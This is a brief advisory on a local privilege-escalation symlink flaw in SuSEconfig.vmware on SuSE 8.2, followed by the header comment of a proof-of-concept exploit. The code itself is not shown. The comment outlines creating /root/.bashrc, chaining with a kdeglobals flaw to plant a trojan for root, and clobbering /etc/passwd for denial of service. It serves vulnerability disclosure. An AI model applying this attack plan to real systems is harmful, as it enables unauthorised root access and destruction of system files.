A problem exists in the SuSEWM configuration file used by SuSEConfig. Because of this, it may be possible for a local attacker to gain elevated privileges.

/*
 * Proof of Concept for SuSEconfig.vmware Symbolic Link.
 * Tested on SuSE 8.2.
 * Nash Leon  - nashleon@yahoo.com.br
 *
 * Reference:
 * http://www.security.nnov.ru/search/document.asp?docid=5216
 *
 * We Need Yast2 for elevation privilege(or wait root run then).
 *
 * This sample create file /root/.bashrc in Suse 8.2.
 * If you use this with kdeglobals vulnerability, you can install trojan
 * horse in bashrc(local root is possible). Denial of Service too,
 * if you define target file /etc/passwd or other.
